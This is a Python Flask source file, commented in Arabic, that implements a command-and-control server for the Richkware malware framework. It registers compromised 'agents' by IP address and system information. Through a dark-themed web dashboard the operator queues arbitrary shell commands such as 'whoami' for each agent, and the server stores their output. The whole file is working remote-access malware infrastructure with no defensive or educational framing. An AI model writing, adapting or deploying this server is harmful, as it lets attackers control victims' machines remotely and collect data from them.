# c2_server.py - سيرفر متوافق مع Richkware (نسخة مصححة)

from flask import Flask, request, jsonify, render_template_string
import time
import json
from datetime import datetime
import hashlib

app = Flask(__name__)

# ==================== إعدادات Richkware ====================
ENCRYPTION_KEY = "7Fd3#9Lk2$mP5@nQ8!rT4&yU6*zX1"

# تخزين البيانات في الذاكرة
agents = {}          # الأجهزة المسجلة
pending_commands = {} # الأوامر المنتظرة
results = {}         # النتائج المستلمة

# ==================== نقاط النهاية (API) ====================

@app.route('/api/v1/agent/poll', methods=['POST'])
def poll_commands():
    """الوكيل يسأل عن أوامر جديدة وتحديث حالته"""
    try:
        # طباعة البيانات الخام القادمة للفحص في Render Logs
        print(f"\n[!] Incoming Poll from: {request.remote_addr}")
        
        # محاولة قراءة البيانات كـ JSON
        data = request.get_json(silent=True) or {}
        agent_id = data.get('agent_id')

        if not agent_id:
            # إذا لم يرسل ID، نحاول استخراجه من البيانات الخام أو نعطيه اسماً مؤقتاً
            agent_id = f"unknown_{request.remote_addr.replace('.', '_')}"

        # تحديث بيانات الوكيل في القائمة
        if agent_id not in agents:
            print(f"[+] New Agent Registered: {agent_id}")
            agents[agent_id] = {
                'first_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'system_info': data.get('system_info', {}),
                'ip': request.remote_addr
            }
        
        agents[agent_id]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        agents[agent_id]['status'] = 'Online'

        # التحقق من وجود أوامر معلقة لهذا الجهاز
        if agent_id in pending_commands and pending_commands[agent_id]:
            command = pending_commands[agent_id].pop(0)
            print(f"[#] Sending Command: {command['cmd']} to {agent_id}")
            return jsonify({
                'has_command': True,
                'command_id': command['id'],
                'command': command['cmd'],
                'args': command.get('args', [])
            }), 200
        
        # إذا لا توجد أوامر، نرد برد فارغ
        return jsonify({
            'has_command': False,
            'server_time': datetime.now().isoformat()
        }), 200

    except Exception as e:
        print(f"[-] Error in Poll: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/v1/agent/result', methods=['POST'])
def submit_result():
    """استلام نتائج تنفيذ الأوامر من الوكيل"""
    try:
        data = request.get_json(silent=True) or {}
        agent_id = data.get('agent_id', 'unknown')
        command_id = data.get('command_id', 'none')
        output = data.get('output', '')

        print(f"[V] Result Received from {agent_id} for command {command_id}")

        key = f"{agent_id}_{command_id}_{int(time.time())}"
        results[key] = {
            'agent_id': agent_id,
            'command_id': command_id,
            'output': output,
            'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        return jsonify({'status': 'received'}), 200
    except Exception as e:
        print(f"[-] Error in Result: {e}")
        return jsonify({'error': str(e)}), 500

# ==================== واجهة التحكم (Dashboard) ====================

@app.route('/')
def index():
    """لوحة التحكم لعرض الأجهزة"""
    html = """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>C2 Control Panel</title>
        <style>
            body { font-family: sans-serif; background: #121212; color: #e0e0e0; padding: 20px; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #1e1e1e; }
            th, td { padding: 12px; border: 1px solid #333; text-align: right; }
            th { background: #333; color: #00ff00; }
            .status-on { color: #00ff00; font-weight: bold; }
            input, button { padding: 8px; border-radius: 4px; border: 1px solid #444; }
            button { background: #007bff; color: white; cursor: pointer; }
            .card { background: #1e1e1e; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
        </style>
    </head>
    <body>
        <div class="card">
            <h1>🎮 لوحة التحكم C2</h1>
            <p>عدد الأجهزة المتصلة: <strong>{{ agents_count }}</strong></p>
        </div>

        <table>
            <thead>
                <tr>
                    <th>المعرف (Agent ID)</th>
                    <th>IP Address</th>
                    <th>آخر ظهور</th>
                    <th>الحالة</th>
                    <th>إرسال أمر</th>
                </tr>
            </thead>
            <tbody>
                {% for id, info in agents.items() %}
                <tr>
                    <td>{{ id }}</td>
                    <td>{{ info.ip }}</td>
                    <td>{{ info.last_seen }}</td>
                    <td class="status-on">متصل</td>
                    <td>
                        <form action="/send-command" method="POST" style="display:inline;">
                            <input type="hidden" name="agent_id" value="{{ id }}">
                            <input type="text" name="command" placeholder="مثلاً whoami" required>
                            <button type="submit">إرسال</button>
                        </form>
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
        <br>
        <div class="card">
            <h3>📊 آخر النتائج المستلمة:</h3>
            <ul>
                {% for key, res in results.items() %}
                <li><strong>{{ res.agent_id }}:</strong> {{ res.output }} <small>({{ res.time }})</small></li>
                {% endfor %}
            </ul>
        </div>
    </body>
    </html>
    """
    return render_template_string(html, agents=agents, agents_count=len(agents), results=results)

@app.route('/send-command', methods=['POST'])
def send_command():
    agent_id = request.form.get('agent_id')
    cmd_text = request.form.get('command')
    
    if agent_id and cmd_text:
        if agent_id not in pending_commands:
            pending_commands[agent_id] = []
        
        cmd_id = hashlib.md5(f"{agent_id}{cmd_text}{time.time()}".encode()).hexdigest()[:8]
        pending_commands[agent_id].append({
            'id': cmd_id,
            'cmd': cmd_text,
            'args': []
        })
        print(f"[+] Command Queued for {agent_id}: {cmd_text}")
    
    return """<script>alert('تم وضع الأمر في القائمة'); window.location.href='/';</script>"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
